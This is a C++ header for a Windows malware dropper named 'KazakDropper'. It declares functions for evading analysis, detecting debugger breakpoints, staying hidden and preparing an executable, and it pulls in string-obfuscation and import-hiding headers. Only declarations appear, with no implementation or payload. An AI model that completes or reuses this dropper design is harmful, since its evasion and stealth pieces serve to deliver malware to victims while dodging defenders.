#pragma once

#include <Windows.h>
#include <string>
#include <iostream>
#include <filesystem>
#include <thread>

#include "../headers/obfuscation/li.h"
#include "../headers/obfuscation/xor.h"



namespace KazakDropper
{
	bool EvadeAnalysis();
	BOOL IsBp(const char* lpszModule, const char* lpszFunction);

	void Stealth();
	void PrepareExe();
}

namespace KazakUtils
{
	std::string replace_all(std::string subject, const std::string& search, const std::string& replace);
	std::string StringWrapper(const std::string url);
}
